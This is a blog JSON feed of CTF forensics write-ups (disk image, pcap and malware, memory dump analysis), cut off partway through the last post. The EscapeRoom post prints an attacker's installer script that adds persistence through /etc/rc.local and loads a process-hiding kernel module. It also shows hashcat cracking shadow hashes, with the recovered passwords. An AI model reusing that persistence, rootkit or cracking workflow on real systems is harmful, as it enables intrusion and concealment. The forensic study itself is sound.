{
    "version": "https://jsonfeed.org/version/1",
    "title": "4n6 & k8s • All posts by \"cyberdefenders\" category",
    "description": "We are a Forensics Duo at SOter14 CTF Team & Network Engineering Students at INSAT. Enjoy our Kubernetes Articles and Write-ups!",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/09/09/CyberDefenders/affrica-falls/",
            "url": "http://example.com/2022/09/09/CyberDefenders/affrica-falls/",
            "title": "CyberDefenders Writeup AfricanFalls",
            "date_published": "2022-09-08T23:20:27.000Z",
            "content_html": "<p>This CTF challenge is from AfricaFalls Digital Forensics contest , We have disk image that have a lot of information like password, registries, browser history etc…<br>\nWe will investigate some useful informations! Be ready</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>John Doe was accused of doing illegal activities. A disk image of his laptop was taken. Your task is to analyze the image and understand what happened under the hood.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Brave</p>\n          </div></div><div class=\"item\" title=\"Author - DFIRScience\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\" data-background-image=\"https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\">Author - DFIRScience</span>\n          <p class=\"desc\">DFIRScience Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<blockquote>\n<p>1- What is the MD5 hash value of the suspect disk?</p>\n</blockquote>\n<p>Just inspec the  <code>ad1.txt</code>  and you’ll find useful information about the disk image like the acquisition time and the checksum</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> DiskDrigger.ad1.txt </span><br><span class=\"line\">Created By AccessData® FTK® Imager 4.5.0.3</span><br><span class=\"line\"></span><br><span class=\"line\">Case Information:</span><br><span class=\"line\">Acquired using: ADI4.5.0.3</span><br><span class=\"line\">...</span><br><span class=\"line\">[Computed Hashes]</span><br><span class=\"line\"> MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1</span><br><span class=\"line\"> SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a</span><br><span class=\"line\"></span><br><span class=\"line\">Image information:</span><br><span class=\"line\"> Acquisition started:   Tue Jun 15 12:28:20 2021</span><br><span class=\"line\"> Acquisition finished:  Tue Jun 15 12:33:10 2021</span><br><span class=\"line\"> Segment list:</span><br><span class=\"line\">  D:\\Users\\Mawso3a\\Desktop\\DiskDrigger.ad1</span><br><span class=\"line\"></span><br><span class=\"line\">Image Verification Results:</span><br><span class=\"line\"> Verification started:  Tue Jun 15 12:33:18 2021</span><br><span class=\"line\"> Verification finished: Tue Jun 15 12:33:51 2021</span><br><span class=\"line\"> MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1 : verified</span><br><span class=\"line\"> SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a : verified</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 9471e69c95d8909ae60ddff30d50ffa1</p>\n</div>\n<blockquote>\n<p>2- What phrase did the suspect search for on 2021-04-29 18:17:38 UTC? (three words, two spaces in between)<br>\nWe found that the user used a chrome as his main browser! So we decide to get the database that contains the history of browsing. We can inspect it with DB Browser SQLite<br>\n<img data-src=\"https://imgur.com/YdY9w1L.png\" alt=\"\"><br>\nAfter Opening the database you can search about the history and find the correct answer using the right timestamp</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/jL9EEDB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  password cracking lists</p>\n</div>\n<blockquote>\n<p>3- What is the IPv4 address of the FTP server the suspect connected to?</p>\n</blockquote>\n<p>Wait man! FileZilla is installed in our system. I am sure that we will find the information in  <code>filezilla.xml</code></p>\n<p><img data-src=\"https://imgur.com/uOJpYIM.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  192.168.1.20</p>\n</div>\n<blockquote>\n<p>4- What date and time was a password list deleted in UTC? (YYYY-MM-DD HH:MM:SS UTC)</p>\n</blockquote>\n<p>This is EASY DUDE! just check the Recycle Bin ! You’ll find your target !<br>\n<img data-src=\"https://imgur.com/TuEyvM2.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  2021-04-29 18:22:17 UTC</p>\n</div>\n<blockquote>\n<p>5- How many times was Tor Browser ran on the suspect’s computer? (number only)</p>\n</blockquote>\n<p>I guess this question is tricky! where is tor man !!! OK calm down you’ll find  <code>lnk</code>  file about tor but i think it’s fake one ! Let’s try an LNK Parser. I’ll use  <code>ericzimmerman</code>  tool !</p>\n<p><img data-src=\"https://imgur.com/GelvVNQ.png\" alt=\"\"></p>\n<p>Wow firefox.exe in TOR LNK file! This is Joke</p>\n<div class=\"note success\">\n<p>Answer:  0</p>\n</div>\n<blockquote>\n<p>6- What is the suspect’s email address?</p>\n</blockquote>\n<p>OK backing again to the browser history to check if the user visit a mailing website !<br>\n<img data-src=\"https://imgur.com/BmHa8m2.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:   <span class=\"exturl\" data-url=\"bWFpbHRvOmRyZWFtbWFrZXI4MkBwcm90b25tYWlsLmNvbQ==\">dreammaker82@protonmail.com</span></p>\n</div>\n<blockquote>\n<p>7- What is the FQDN did the suspect port scan?</p>\n</blockquote>\n<p>He asked about port scan?? mmm I guess nmap is here ! Nmap are you here ?<br>\n<img data-src=\"https://imgur.com/UMN9Zbr.png\" alt=\"\" title=\"NMAP: YES I AM HERE !\"></p>\n<p>Just i checked the PowerShell history. You’ll find it in  <code>AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine</code></p>\n<p><img data-src=\"https://imgur.com/OwOcsXB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  dfir.science</p>\n</div>\n<blockquote>\n<p>8- What country was picture “20210429_152043.jpg” allegedly taken in?</p>\n</blockquote>\n<p>I tried to inspect the metadata of the image and i found GPS position information!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exiftool 20210429_152043.jpg</span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">GPS Latitude                    : 16 deg 0<span class=\"string\">&#x27; 0.00&quot; S</span></span><br><span class=\"line\"><span class=\"string\">GPS Longitude                   : 23 deg 0&#x27;</span> 0.00<span class=\"string\">&quot; E</span></span><br><span class=\"line\"><span class=\"string\">Focal Length                    : 3.7 mm</span></span><br><span class=\"line\"><span class=\"string\">GPS Position                    : 16 deg 0&#x27; 0.00&quot;</span> S, 23 deg 0<span class=\"string\">&#x27; 0.00&quot; E</span></span><br><span class=\"line\"><span class=\"string\">Light Value                     : 13.7</span></span><br></pre></td></tr></table></figure>\n<p>Ok let’s try to find the country using GPS Coordinates Finder</p>\n<p><img data-src=\"https://imgur.com/freR9Vd.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  Zambia</p>\n</div>\n<blockquote>\n<p>9- What is the parent folder name picture “20210429_151535.jpg” was in before the suspect copy it to “contact” folder on his desktop?</p>\n</blockquote>\n<p>Shellbags explorer will solve our problem here! But wait man ! What are ShellBag artifacts?<br>\n <code>ShellBags</code>  are a popular artifact in Windows forensics often used to identify the existence of directories on local, network, and removable storage devices. ShellBags are stored as a highly nested and hierarchal set of subkeys in the UsrClass<br>\nThis registyr hive will save us :  <code>[root]\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\Usrclass.dat</code></p>\n<p>ٍ<img data-src=\"https://imgur.com/IAJ0GBZ.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  Camera</p>\n</div>\n<blockquote>\n<p>10- A Windows password hashes for an account are below. What is the user’s password?</p>\n</blockquote>\n<p>Just try an online hash cracker</p>\n<p>ٍ<img data-src=\"https://imgur.com/eQ1U5w7.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:   AFR1CA!</p>\n</div>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/07/CyberDefenders/EscapeRoom/",
            "url": "http://example.com/2022/09/07/CyberDefenders/EscapeRoom/",
            "title": "CyberDefenders Writeup EscapeRoom",
            "date_published": "2022-09-07T15:28:39.000Z",
            "content_html": "<p>This CTF challenge is made by The Honeynet Project organization. This challenge is a combination of several entry to intermediate-level tasks of increasing difficulty focusing on authentication, information hiding, and cryptography.</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>You belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - EscapeRoom</p>\n          </div></div><div class=\"item\" title=\"Author - The Honeynet Project\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=\" data-background-image=\"https://pbs.twimg.com/profile_images/582417177254334464/BNceiZYA_400x400.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=\">Author - The Honeynet Project</span>\n          <p class=\"desc\">The Honeynet Project Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>We start analyzing the pcap file, i open it with Brim Security and checking the alerts!! Oh god! A lot of ssh flows! mmm I guess the attacker try to gain access through the ssh service, he did a bruteforce attack !<br>\n<img data-src=\"https://imgur.com/cXk82fL.png\" alt=\"\"></p>\n<blockquote>\n<p>1- What service did the attacker use to gain access to the system?</p>\n</blockquote>\n<p>The attacker use ssh protocol to gain access to the system !</p>\n<div class=\"note success\">\n<p>Answer: ssh</p>\n</div>\n<blockquote>\n<p>2- What attack type was used to gain access to the system?(one word)</p>\n</blockquote>\n<p>We found a lot of ssh packets! I am sure this is a bruteforce attack</p>\n<div class=\"note success\">\n<p>Answer: bruteforce</p>\n</div>\n<blockquote>\n<p>3- What was the tool the attacker possibly used to perform this attack?</p>\n</blockquote>\n<p>One of the most famous tools that can do this type of attack is hydra<br>\nHydra is an amazing tool for testing the strength of your SSH security. It is capable of running through massive lists of usernames, passwords, and targets to test if you or a user is using a potentially vulnerable password.</p>\n<div class=\"note success\">\n<p>Answer: Hydra</p>\n</div>\n<blockquote>\n<p>4- How many failed attempts were there?</p>\n</blockquote>\n<p>Let’s inspect the alert events in Brim Security and apply the count() by feature in the  <code>alert.signature</code> . We found 53  <code>NetSSH Hardcoded in Metasploit</code> . We decrease by 1 the success one!<br>\n<img data-src=\"https://imgur.com/DpgkZjt.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 52</p>\n</div>\n<p>We have the hashes of the passwords! We know that the hashes are SHA-512(UNIX). The black cat (oh means hashcat) will help us cracking these hashes!<br>\nٍ<img data-src=\"https://imgur.com/DN0qNUF.png\" alt=\"\"></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat -a 0 -m 1800 shadow.log rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Running</span><br><span class=\"line\">Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))</span><br><span class=\"line\">Hash.Target......: crack.txt</span><br><span class=\"line\">Time.Started.....: Wed Sep  7 23:58:23 2022 (43 mins, 15 secs)</span><br><span class=\"line\">Time.Estimated...: Fri Sep  9 04:15:48 2022 (1 day, 3 hours)</span><br><span class=\"line\">Kernel.Feature...: Pure Kernel</span><br><span class=\"line\">Guess.Base.......: File (/mnt/c/Users/Mohamed Rafraf/Desktop/rockyou.txt)</span><br><span class=\"line\">Guess.Queue......: 1/1 (100.00%)</span><br><span class=\"line\">Speed.1.........:      986 H/s (5.30ms) @ Accel:32 Loops:1024 Thr:1 Vec:4</span><br><span class=\"line\">Recovered........: 3/10 (30.00%) Digests, 3/10 (30.00%) Salts</span><br><span class=\"line\">Progress.........: 3579360/143443840 (2.50%)</span><br><span class=\"line\">Rejected.........: 0/3579360 (0.00%)</span><br><span class=\"line\">Restore.Point....: 357920/14344384 (2.50%)</span><br><span class=\"line\">Restore.Sub.1...: Salt:5 Amplifier:0-1 Iteration:4096-5000</span><br><span class=\"line\">Candidate.Engine.: Device Generator</span><br><span class=\"line\">Candidates.1....: donjoe -&gt; dominique12</span><br><span class=\"line\"></span><br><span class=\"line\">[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>5- What credentials (username:password) were used to gain access? Refer to shadow.log and sudoers.log.</p>\n</blockquote>\n<p>Just wait for hashcat man!</p>\n<div class=\"note success\">\n<p>manager:forgot</p>\n</div>\n<blockquote>\n<p>6- What other credentials (username:password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log.</p>\n</blockquote>\n<p>Hashcat will save you for sure !</p>\n<div class=\"note success\">\n<p>sean:spectre</p>\n</div>\n<blockquote>\n<p>7- What is the tool used to download malicious files on the system?</p>\n</blockquote>\n<p>Let’s check the  <code>user-agent</code>  in brim security. you can do it with wireshark too!<br>\n<img data-src=\"https://imgur.com/P9haLBY.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: wget</p>\n</div>\n<blockquote>\n<p>8- How many files the attacker download to perform malware installation?</p>\n</blockquote>\n<p>Checking the non-media files in brim security will help us to know about the files</p>\n<p><img data-src=\"https://imgur.com/P6St7uU.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 3</p>\n</div>\n<blockquote>\n<p>9- What is the main malware MD5 hash?</p>\n</blockquote>\n<p>The malware is an executable file for sure! let’s check it</p>\n<p><img data-src=\"https://imgur.com/VN12PmD.png\" alt=\"\"></p>\n<p>Open the details about it and you’ll get the md5sum !</p>\n<p><img data-src=\"https://imgur.com/YgnR9gz.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 772b620736b760c1d736b1e6ba2f885b</p>\n</div>\n<p>We found this bash script that rename the malware mail and hide it in /var/mail/ directory and make it executable at the startup!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mv</span> 1 /var/mail/mail</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /var/mail/mail</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;/var/mail/mail &amp;\\nsleep 1\\npidof mail &gt; /proc/dmesg\\nexit 0&quot;</span> &gt; /etc/rc.local</span><br><span class=\"line\"><span class=\"built_in\">nohup</span> /var/mail/mail &gt; /dev/null 2&gt;&amp;1&amp;</span><br><span class=\"line\"><span class=\"built_in\">mv</span> 2 /lib/modules/`<span class=\"built_in\">uname</span> -r`/sysmod.ko</span><br><span class=\"line\">depmod -a</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;sysmod&quot;</span> &gt;&gt; /etc/modules</span><br><span class=\"line\">modprobe sysmod</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\">pidof mail &gt; /proc/dmesg</span><br><span class=\"line\"><span class=\"built_in\">rm</span> 3</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>10- What file has the script modified so the malware will start upon reboot?</p>\n</blockquote>\n<p>The script /etc/rc.local is for use by the system administrator. It is traditionally executed after all the normal system services are started</p>\n<div class=\"note success\">\n<p>Answer: /etc/rc.local</p>\n</div>\n<blockquote>\n<p>11- Where did the malware keep local files?</p>\n</blockquote>\n<div class=\"note success\">\n<p>/var/mail/</p>\n</div>\n<blockquote>\n<p>12- What is missing from ps.log?</p>\n</blockquote>\n<p>In the ps.log we don’t find the process related to the malware (the mail executable)</p>\n<div class=\"note success\">\n<p>/var/mail/mail</p>\n</div>\n<blockquote>\n<p>13- What is the main file that used to remove this information from ps.log?</p>\n</blockquote>\n<p>There is another binary that moved and renamed as  <code>sysmod.ko</code></p>\n<div class=\"note success\">\n<p>Answer: sysmod.ko</p>\n</div>\n<blockquote>\n<p>14- Inside the Main function, what is the function that causes requests to those servers?</p>\n</blockquote>\n<p>After unpacking the malware. I opened the binary with IDA Pro to decompile it. Check the main function and we found this !</p>\n<p><img data-src=\"https://imgur.com/79houmJ.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: requestFile</p>\n</div>\n<blockquote>\n<p>15- One of the IP’s the malware contacted starts with 17. Provide the full IP.</p>\n</blockquote>\n<p>requestFile function use address array as parameters. let’s check it ! we found all the IP address. COOL !</p>\n<p><img data-src=\"https://imgur.com/4NLcX9k.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 174.129.57.253</p>\n</div>\n<blockquote>\n<p>16- How many files the malware requested from external servers?</p>\n</blockquote>\n<p>This is easy man ! just check the other downloaded files !</p>\n<p><img data-src=\"https://imgur.com/hjMszwa.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 9</p>\n</div>\n<blockquote>\n<p>17- What are the commands that the malware was receiving from attacker servers? Format: comma-separated in alphabetical order</p>\n</blockquote>\n<p>After spending time on thinking and searching. We get the idea !<br>\nThe malware will get message form attacker servers! So let’s check some functions call that related to something like messaging ! You’ll find these functions in main !</p>\n<p><img data-src=\"https://imgur.com/V4JQttO.png\" alt=\"\"></p>\n<p>The function check if the parameter has these 2 values ! I want to check it</p>\n<p><img data-src=\"https://imgur.com/KSxTPRa.png\" alt=\"\"></p>\n<p>After using python to convert the numbers to text using long_to_bytes function i found that 2 values are instruction in the assembly , Bingo we get it !</p>\n<p><img data-src=\"https://imgur.com/Hz6LsfB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: nop,run</p>\n</div>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/06/CyberDefenders/brave/",
            "url": "http://example.com/2022/09/06/CyberDefenders/brave/",
            "title": "CyberDefenders Writeup Brave",
            "date_published": "2022-09-06T10:29:37.000Z",
            "content_html": "<p>This CTF challenge is about retrieving data from a memory dump, and analyzing the processes and connections and dealing with registries!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Brave</p>\n          </div></div><div class=\"item\" title=\"Author - DFIRScience\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\" data-background-image=\"https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\">Author - DFIRScience</span>\n          <p class=\"desc\">DFIRScience Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>Memory acquisition  involves copying the contents of volatile memory to non-volatile storage. This is arguably one of the most important and precarious steps in the memory forensics process<br>\nThe memory dump will contains many usefull information like the time of the memory acquisition, The KB version, The build number and version of the operating system</p>\n<blockquote>\n<p>1- What time was the RAM image acquired according to the suspect system? (YYYY-MM-DD HH:MM:SS)</p>\n</blockquote>\n<p>We can inspect these information using  <code>imageinfo</code>  plugin in volatility</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.info </span><br><span class=\"line\"></span><br><span class=\"line\">Kernel Base     0xf8043cc00000</span><br><span class=\"line\">DTB     0x1aa000</span><br><span class=\"line\">Symbols ........</span><br><span class=\"line\">Is64Bit True</span><br><span class=\"line\">IsPAE   False</span><br><span class=\"line\">layer_name      0 WindowsIntel32e</span><br><span class=\"line\">memory_layer    1 FileLayer</span><br><span class=\"line\">KdVersionBlock  0xf8043d80f368</span><br><span class=\"line\">Major/Minor     15.19041</span><br><span class=\"line\">MachineType     34404</span><br><span class=\"line\">KeNumberProcessors      4</span><br><span class=\"line\">SystemTime      2021-04-30 17:52:19</span><br><span class=\"line\">NtSystemRoot    C:\\Windows</span><br><span class=\"line\">NtProductType   NtProductWinNt</span><br><span class=\"line\">NtMajorVersion  10</span><br><span class=\"line\">NtMinorVersion  0</span><br><span class=\"line\">PE MajorOperatingSystemVersion  10</span><br><span class=\"line\">PE MinorOperatingSystemVersion  0</span><br><span class=\"line\">PE Machine      34404</span><br><span class=\"line\">PE TimeDateStamp        Tue Oct 11 07:04:26 1977</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  2021-04-30 17:52:19</p>\n</div>\n<blockquote>\n<p>2- What is the SHA256 hash value of the RAM image?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sha256sum</span> 20210430-Win10Home-20H2-64bit-memdump.mem</span><br><span class=\"line\">9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172 20210430-Win10Home-20H2-64bit-memdump.mem</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172</p>\n</div>\n<blockquote>\n<p>3- What is the process ID of “brave.exe”?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist | grep -i brave</span><br><span class=\"line\">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime              ExitTime       </span><br><span class=\"line\">4856    1872    brave.exe       0xbf0f6ca782c0  0       -       1               False    2021-04-30 17:48:45    2021-04-30 17:50:56</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 4856</p>\n</div>\n<blockquote>\n<p>4- How many established network connections were there at the time of acquisition? (number)</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i <span class=\"string\">&quot;2021-04-30&quot;</span> | grep -i ESTABLISHED</span><br><span class=\"line\">0xbf0f6a53ca20  TCPv4   10.0.2.15       49833   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:50:07</span><br><span class=\"line\">0xbf0f6ad16050  TCPv4   10.0.2.15       49829   142.250.191.208 443     ESTABLISHED     5624    svchost.exe     2021-04-30 17:49:58</span><br><span class=\"line\">0xbf0f6ad1fad0  TCPv4   10.0.2.15       49847   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:52:17</span><br><span class=\"line\">0xbf0f6c6352b0  TCPv4   10.0.2.15       49842   52.113.196.254  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:25</span><br><span class=\"line\">0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00</span><br><span class=\"line\">0xbf0f6cd4fa20  TCPv4   10.0.2.15       49837   204.79.197.200  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:18</span><br><span class=\"line\">0xbf0f6d0c64a0  TCPv4   10.0.2.15       49843   204.79.197.222  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:26</span><br><span 